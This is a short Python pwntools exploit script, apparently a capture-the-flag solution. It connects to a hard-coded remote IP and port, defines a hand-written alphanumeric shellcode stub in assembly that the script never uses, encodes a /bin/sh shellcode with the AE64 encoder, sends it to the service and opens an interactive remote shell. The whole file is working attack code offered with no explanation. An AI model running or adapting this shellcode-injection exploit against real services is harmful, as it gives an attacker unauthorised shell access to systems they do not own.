#!/usr/bin/env python

from pwn import *
from pwnlib import gdb
from pwnlib.asm import *
from pwnlib.context import context
from ae64 import AE64

r = remote('111.186.57.85', 30012)
# r = process('./bin/sc2')
# gdb.attach(r)


context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

payload_asm = """
    push %rdx
    push %rdx
    push %rdx
    pop %rax

prepare_ff:        
  push $0x30                
  push %rsp                
  pop %rcx              
  pop %rax            
  xor $0x35, %al           
  push %rax                
  imul $0x33, (%rcx), %esi

prepare_f8:  
  push %rsi             
  pop %rax               

  xor $0x30, %al       
  xor $0x37, %al        

write_negative_8:     
  xor 0x74(%rcx), %eax     
  xor %eax, 0x74(%rcx)   

  xor %esi, 0x75(%rcx) 
  xor %esi, 0x76(%rcx) 
  xor %esi, 0x77(%rcx) 
read_negative_8:    
  movslq 0x74(%rcx), %rdi

get_return_pointer:        
  xor %esi, (%rcx, %rdi, 2) 
  xor (%rcx, %rdi, 2), %rsi 

prepare_key:       
  push $0x5658356a        
  pop %rax           

decode_encoded_code:   
  xor %eax, 0x4b(%rsi)   

decode_encoded_data:      
  xor %eax, 0x53(%rsi)     
  xor 0x4f(%rsi), %rax      

begin_stack_setup:     
  push %rax                 
  push %rsp                 
  

zero_rax:          
  push $0x30               
  pop %rax               
  xor $0x30, %al

end_stack_setup:
  push %rax
  push %rax


mov_3b_al:
  xor $0x75, %al
  xor $0x4e, %al
begin_stack_run:
  pop %rdx
encoded_code:
  .byte 0x34
  .byte 0x6a
  .byte 0x57
  .byte 0x53
encoded_data:
  .byte 0x45
  .byte 0x57
  .byte 0x31
  .byte 0x38
  .byte 0x45
  .byte 0x46
  .byte 0x30
  .byte 0x56
"""

obj = AE64()
payload = obj.encode(asm(shellcraft.sh()), 'rdx')


r.recvuntil('Input your shellcode:')
r.send(payload)

r.interactive()
